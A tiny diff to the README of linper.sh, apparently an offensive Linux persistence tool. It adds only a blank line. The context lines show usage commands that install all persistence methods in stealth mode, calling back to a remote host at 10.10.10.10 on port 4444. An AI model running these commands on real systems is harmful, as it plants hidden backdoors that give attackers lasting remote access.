@@ -32,6 +32,7 @@ Enumerate and do not install
 Enumerate all persistence methods and install (stealth mode)
 
 `bash linper.sh --rhost 10.10.10.10 --rport 4444 --stealth-mode`
+
 `bash linper.sh -i 10.10.10.10 -p 4444 -s`
 
 ## methodology
